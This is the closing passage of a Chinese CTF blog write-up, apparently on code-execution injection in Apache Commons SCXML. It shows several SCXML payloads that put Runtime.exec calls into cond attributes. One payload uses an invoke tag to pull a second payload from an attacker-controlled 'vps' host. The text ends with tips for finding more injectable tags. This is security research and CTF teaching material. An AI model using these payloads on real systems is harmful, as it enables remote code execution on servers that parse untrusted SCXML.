class="tag">&lt;/<span class="name">invoke</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parallel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">history</span> <span class="attr">src</span>=<span class="string">&quot;test&quot;</span> <span class="attr">content</span>=<span class="string">&quot;test&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">cond</span>=<span class="string">&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">history</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">cond</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">invoke</span> <span class="attr">src</span>=<span class="string">&quot;http://vps/2.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--2.xml放上面随便一个payload都可以 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其他还有很多payload，不想一个个测，直接说一下原理，去寻找哪里调用了setExpr或者setCond即可<br>onEntry的替代品可以是onexit，然后最后可以附带expr属性的标签可以是location、assign，还有一些带cond的也是，就在上面的SCXMLReader方法里面一个个找，就五个最外层的大标签</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CTF/" class="tag">#CTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/04/24/DASCTF%202023%20Apr%20X%20SU%20Web%20Writeup/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">DASCTF 2023 Apr X SU Web Writeup</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/04/19/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E6%8A%8AXsleaks/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">年轻人的第一把Xsleaks</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
